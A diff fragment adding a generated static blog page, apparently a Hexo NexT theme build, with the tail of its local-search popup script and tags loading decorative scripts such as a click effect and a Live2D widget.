+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
